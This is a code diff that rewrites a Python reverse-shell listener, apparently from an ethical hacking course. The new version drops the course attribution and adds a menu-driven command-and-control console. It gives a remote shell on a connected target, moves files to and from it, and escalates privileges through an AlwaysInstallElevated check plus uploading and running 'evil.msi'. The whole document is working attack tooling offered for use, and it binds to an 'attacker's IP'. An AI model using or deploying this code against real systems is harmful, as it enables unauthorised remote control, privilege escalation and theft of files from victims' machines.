@@ -1,106 +1,106 @@
-################################################
-# Author: Watthanasak Jeamwatthanachai, PhD    #
-# Class: SIIT Ethical Hacking, 2023-2024       #
-################################################
+import socket
+import json
+import os
 
-# Import necessary libraries
-import socket  # This library is used for creating socket connections.
-import json  # JSON is used for encoding and decoding data in a structured format.
-import os  # This library allows interaction with the operating system.
-
-
-# Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
-    # Convert the input data into a JSON-encoded string.
     jsondata = json.dumps(data)
-    # Send the JSON-encoded data over the network connection after encoding it as bytes.
     target.send(jsondata.encode())
 
-
-# Function to receive data reliably as JSON-decoded strings
 def reliable_recv():
     data = ''
     while True:
         try:
-            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
-            # and remove any trailing whitespace characters.
-            data = data + target.recv(1024).decode().rstrip()
-            # Parse the received data as a JSON-decoded object.
+            data += target.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
-
-# Function to upload a file to the target machine
 def upload_file(file_name):
-    # Open the specified file in binary read ('rb') mode.
-    f = open(file_name, 'rb')
-    # Read the contents of the file and send them over the network connection to the target.
-    target.send(f.read())
+    with open(file_name, 'rb') as f:
+        target.send(f.read())
 
-
-# Function to download a file from the target machine
 def download_file(file_name):
-    # Open the specified file in binary write ('wb') mode.
-    f = open(file_name, 'wb')
-    # Set a timeout for receiving data from the target (1 second).
-    target.settimeout(1)
-    chunk = target.recv(1024)
-    while chunk:
-        # Write the received data (chunk) to the local file.
-        f.write(chunk)
+    with open(file_name, 'wb') as f:
+        target.settimeout(1)
         try:
-            # Attempt to receive another chunk of data from the target.
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    # Reset the timeout to its default value (None).
-    target.settimeout(None)
-    # Close the local file after downloading is complete.
-    f.close()
+            while True:
+                chunk = target.recv(1024)
+                if not chunk:
+                    break
+                f.write(chunk)
+        except socket.timeout:
+            pass
+        target.settimeout(None)
 
+def show_priv_esc_menu():
+    print("\n=== Privilege Escalation Menu ===")
+    print("[1] Check AlwaysInstallElevated (AIE)")
+    print("[2] Upload evil.msi")
+    print("[3] Run evil.msi")
+    print("[4] Delete hacker user")
+    print("[5] Return to main menu")
 
-# Function for the main communication loop with the target
 def target_communication():
     while True:
-        # Prompt the user for a command to send to the target.
-        command = input('* Shell~%s: ' % str(ip))
-        # Send the user's command to the target using the reliable_send function.
-        reliable_send(command)
-        if command == 'quit':
-            # If the user enters 'quit', exit the loop and close the connection.
+        print("\n=== Main Menu ===")
+        print("[S] Open shell")
+        print("[P] Privilege Escalation")
+        print("[Q] Quit")
+        choice = input("Select an option: ").strip().lower()
+
+        if choice == 'q':
+            reliable_send("quit")
             break
-        elif command == 'clear':
-            # If the user enters 'clear', clear the terminal screen.
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target (not implemented).
-            pass
-        elif command[:8] == 'download':
-            # If the user enters 'download', initiate the download of a file from the target.
-            download_file(command[9:])
-        elif command[:6] == 'upload':
-            # If the user enters 'upload', initiate the upload of a file to the target.
-            upload_file(command[7:])
+
+        elif choice == 's':
+            while True:
+                command = input('* Shell~%s: ' % str(ip))
+                if command == 'menu':
+                    print("[*] Returning to main menu...")
+                    break
+                reliable_send(command)
+                if command == 'quit':
+                    return
+                elif command == 'clear':
+                    os.system('clear')
+                elif command[:3] == 'cd ':
+                    pass
+                elif command[:8] == 'download':
+                    download_file(command[9:])
+                elif command[:6] == 'upload':
+                    upload_file(command[7:])
+                else:
+                    result = reliable_recv()
+                    print(result)
+
+        elif choice == 'p':
+            show_priv_esc_menu()
+            tool_choice = input("Select a tool: ").strip()
+
+            if tool_choice == '1':
+                reliable_send("check_aie")
+                print(reliable_recv())
+            elif tool_choice == '2':
+                reliable_send("upload evil.msi")
+                upload_file("evil.msi")
+                print("[+] evil.msi uploaded.")
+            elif tool_choice == '3':
+                reliable_send("run_evil_msi")
+                print(reliable_recv())
+            elif tool_choice == '4':
+                reliable_send("delete_hacker_user")
+                print(reliable_recv())
+            elif tool_choice == '5':
+                continue
+            else:
+                print("[-] Invalid tool selection.")
         else:
-            # For other commands, receive and print the result from the target.
-            result = reliable_recv()
-            print(result)
+            print("[-] Invalid main menu option.")
 
-
-# Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.1.12', 5555))
-
-# Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
+sock.bind(('192.168.1.164', 5555))  # Replace with attacker's IP
 sock.listen(5)
-
-# Accept incoming connection from the target and obtain the target's IP address.
+print('[+] Listening For Incoming Connections...')
 target, ip = sock.accept()
 print('[+] Target Connected From: ' + str(ip))
-
-# Start the main communication loop with the target by calling target_communication.
 target_communication()
